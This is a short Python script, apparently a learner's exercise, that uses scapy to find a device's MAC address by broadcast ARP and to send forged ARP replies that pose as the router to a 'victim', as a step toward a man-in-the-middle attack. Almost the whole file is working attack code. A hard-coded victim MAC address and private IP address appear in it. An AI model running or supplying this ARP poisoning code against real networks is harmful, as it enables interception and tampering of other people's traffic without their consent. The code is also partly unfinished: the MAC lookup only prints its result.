import scapy.all as scapy
# Be caution before attacking MITM - ip forwarding
# Scan the network and see the ip addr and mac of victim
# op - 2 means arp_request and response , pdst - target_ip ,hwdst - target mac address, psrc - router ip address

# same as network_scanner - getting mac address (previous)
def getting_mac(ip_address):
    Arp_request = scapy.ARP(pdst=ip_address) # Create an ARP request for the specified IP range
    Broad_cast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # Create an Ethernet frame for broadcasting
    combined_packet = Broad_cast/Arp_request # Combine the Ether and ARP request
    answered_list = scapy.srp(combined_packet,timeout=1)[0] # getting only answered_list [0]

    print(answered_list [0] [1].hwsrc)# for getting only mac addr we are specifing [0] [1].hwsrc (only the mac) 

def my_poison(target_ip,router_ip):
    sample = scapy.ARP(op=2,pdst=target_ip,hwdst="3c:a0:67:1c:41:43",psrc=router_ip)
    #scapy.ls(scapy.ARP())
    scapy.send(sample) # sending packet (arp)

getting_mac("10.32.242.227")